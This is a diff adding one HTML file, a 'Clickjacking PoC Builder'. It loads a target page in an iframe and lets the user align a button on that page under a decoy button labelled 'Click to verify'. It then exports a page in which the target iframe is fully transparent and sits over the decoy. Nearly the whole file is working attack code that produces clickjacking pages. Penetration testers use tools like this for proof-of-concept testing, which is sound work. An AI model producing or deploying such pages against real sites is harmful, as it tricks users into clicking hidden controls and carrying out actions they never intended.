@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking PoC Builder</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f0f0; margin: 0; overflow: hidden; }
+        
+        /* The Controls Panel */
+        #controls {
+            position: fixed; top: 10px; left: 10px; z-index: 1000;
+            background: white; padding: 15px; border: 1px solid #ccc;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2); border-radius: 5px;
+            width: 250px;
+        }
+        
+        /* The Decoy Element (What the victim sees) */
+        #decoy_button {
+            position: absolute; top: 300px; left: 400px; z-index: 50;
+            background: #007bff; color: white; padding: 15px 30px;
+            border: none; cursor: pointer; font-size: 16px; font-weight: bold;
+            pointer-events: none; /* Let clicks pass through to iframe during testing */
+        }
+
+        /* The Iframe Container (Draggable) */
+        #iframe_container {
+            position: absolute; top: 0; left: 0;
+            width: 80%; height: 80%; z-index: 10;
+        }
+        
+        iframe {
+            width: 100%; height: 100%; border: none;
+            opacity: 0.5; /* Default opacity for calibration */
+            pointer-events: none; /* Allow dragging overlay to capture events */
+        }
+
+        /* Draggable Overlay */
+        #drag_overlay {
+            position: absolute; top: 0; left: 0;
+            width: 100%; height: 100%; z-index: 11;
+            cursor: grab;
+        }
+        
+        #drag_overlay.dragging {
+            cursor: grabbing;
+        }
+
+        /* Resize Handles */
+        .resize-handle {
+            position: absolute;
+            background: lightseagreen;
+            z-index: 12;
+        }
+        
+        /* Corner Handles */
+        .resize-handle.corner {
+            width: 12px;
+            height: 12px;
+        }
+        
+        .resize-handle.nw { top: -6px; left: -6px; cursor: nw-resize; }
+        .resize-handle.ne { top: -6px; right: -6px; cursor: ne-resize; }
+        .resize-handle.sw { bottom: -6px; left: -6px; cursor: sw-resize; }
+        .resize-handle.se { bottom: -6px; right: -6px; cursor: se-resize; }
+        
+        /* Edge Handles */
+        .resize-handle.edge {
+            background: lightseagreen;
+        }
+        
+        .resize-handle.n { top: -4px; left: 50%; transform: translateX(-50%); width: 60px; height: 8px; cursor: n-resize; }
+        .resize-handle.s { bottom: -4px; left: 50%; transform: translateX(-50%); width: 60px; height: 8px; cursor: s-resize; }
+        .resize-handle.w { left: -4px; top: 50%; transform: translateY(-50%); width: 8px; height: 60px; cursor: w-resize; }
+        .resize-handle.e { right: -4px; top: 50%; transform: translateY(-50%); width: 8px; height: 60px; cursor: e-resize; }
+
+        .label { font-size: 12px; color: #666; margin-top: 10px; display: block;}
+    </style>
+</head>
+<body>
+
+    <div id="controls">
+        <h3>PoC Calibration</h3>
+        <p>1. Drag the page to align the target button under the Blue Decoy Button.</p>
+        <p>2. Click "Export Final HTML" when done.</p>
+        
+        <label class="label">Target Opacity:</label>
+        <input type="range" min="0" max="1" step="0.1" value="0.5" id="opacitySlider">
+        
+        <label class="label">Decoy Label:</label>
+        <input type="text" value="Click to verify" id="decoyText" style="width: 100%">
+
+        <hr>
+        <button onclick="exportPoC()">Export Final HTML</button>
+        <p id="coords" style="font-size: 10px; font-family: monospace;"></p>
+    </div>
+
+    <button id="decoy_button">Click to verify</button>
+
+    <div id="iframe_container">
+        <iframe id="target_frame" src="{{TARGET_URL}}"></iframe>
+        <div id="drag_overlay"></div>
+        <!-- Resize Handles -->
+        <div class="resize-handle corner nw" data-direction="nw"></div>
+        <div class="resize-handle corner ne" data-direction="ne"></div>
+        <div class="resize-handle corner sw" data-direction="sw"></div>
+        <div class="resize-handle corner se" data-direction="se"></div>
+        <div class="resize-handle edge n" data-direction="n"></div>
+        <div class="resize-handle edge s" data-direction="s"></div>
+        <div class="resize-handle edge w" data-direction="w"></div>
+        <div class="resize-handle edge e" data-direction="e"></div>
+    </div>
+
+    <script>
+        const container = document.getElementById('iframe_container');
+        const overlay = document.getElementById('drag_overlay');
+        const slider = document.getElementById('opacitySlider');
+        const frame = document.getElementById('target_frame');
+        const decoyBtn = document.getElementById('decoy_button');
+        const decoyInput = document.getElementById('decoyText');
+        const resizeHandles = document.querySelectorAll('.resize-handle');
+        
+        let isDragging = false;
+        let isResizing = false;
+        let resizeDirection = null;
+        let startX, startY, initialLeft, initialTop, initialWidth, initialHeight;
+
+        // Opacity Control
+        slider.addEventListener('input', (e) => {
+            frame.style.opacity = e.target.value;
+        });
+
+        // Update Button Text
+        decoyInput.addEventListener('input', (e) => {
+            decoyBtn.innerText = e.target.value;
+        });
+
+        // Dragging Logic for the Container (using overlay to capture events)
+        overlay.addEventListener('mousedown', (e) => {
+            if (isResizing) return; // Don't drag while resizing
+            isDragging = true;
+            startX = e.clientX;
+            startY = e.clientY;
+            initialLeft = container.offsetLeft;
+            initialTop = container.offsetTop;
+            overlay.classList.add('dragging');
+        });
+        
+        // Resize Logic
+        resizeHandles.forEach(handle => {
+            handle.addEventListener('mousedown', (e) => {
+                e.stopPropagation(); // Prevent drag from triggering
+                isResizing = true;
+                resizeDirection = handle.dataset.direction;
+                startX = e.clientX;
+                startY = e.clientY;
+                initialLeft = container.offsetLeft;
+                initialTop = container.offsetTop;
+                initialWidth = container.offsetWidth;
+                initialHeight = container.offsetHeight;
+            });
+        });
+
+        window.addEventListener('mouseup', () => {
+            isDragging = false;
+            isResizing = false;
+            resizeDirection = null;
+            overlay.classList.remove('dragging');
+            updateCoords();
+        });
+
+        window.addEventListener('mousemove', (e) => {
+            if (isDragging) {
+                const dx = e.clientX - startX;
+                const dy = e.clientY - startY;
+                container.style.left = `${initialLeft + dx}px`;
+                container.style.top = `${initialTop + dy}px`;
+            } else if (isResizing) {
+                const dx = e.clientX - startX;
+                const dy = e.clientY - startY;
+                
+                let newWidth = initialWidth;
+                let newHeight = initialHeight;
+                let newLeft = initialLeft;
+                let newTop = initialTop;
+                
+                // Handle each resize direction
+                if (resizeDirection.includes('e')) {
+                    newWidth = initialWidth + dx;
+                }
+                if (resizeDirection.includes('w')) {
+                    newWidth = initialWidth - dx;
+                    newLeft = initialLeft + dx;
+                }
+                if (resizeDirection.includes('s')) {
+                    newHeight = initialHeight + dy;
+                }
+                if (resizeDirection.includes('n')) {
+                    newHeight = initialHeight - dy;
+                    newTop = initialTop + dy;
+                }
+                
+                // Apply minimum size constraints
+                if (newWidth >= 100) {
+                    container.style.width = `${newWidth}px`;
+                    if (resizeDirection.includes('w')) {
+                        container.style.left = `${newLeft}px`;
+                    }
+                }
+                if (newHeight >= 100) {
+                    container.style.height = `${newHeight}px`;
+                    if (resizeDirection.includes('n')) {
+                        container.style.top = `${newTop}px`;
+                    }
+                }
+            }
+        });
+
+        function updateCoords() {
+            const coords = `Pos: ${container.style.top || '0px'}, ${container.style.left || '0px'} | Size: ${container.style.width || '100%'}, ${container.style.height || '100%'}`;
+            document.getElementById('coords').innerText = coords;
+        }
+
+        function exportPoC() {
+            const html = `
+<style>
+    body { margin: 0; overflow: hidden; }
+    #target { 
+        position: absolute; opacity: 0; 
+        top: ${container.style.top || '0px'}; left: ${container.style.left || '0px'}; 
+        width: ${container.style.width || '100%'}; height: ${container.style.height || '100%'}; z-index: 1; 
+    }
+    #decoy { 
+        position: absolute; top: 300px; left: 400px; z-index: 0;
+        background: blue; color: white; padding: 15px 30px; 
+    }
+</style>
+<button id="decoy">${decoyBtn.innerText}</button>
+<iframe id="target" src="${frame.src}"></iframe>
+            `;
+            console.log(html);
+            alert("PoC HTML copied to console! (F12)");
+        }
+    </script>
+</body>
+</html>
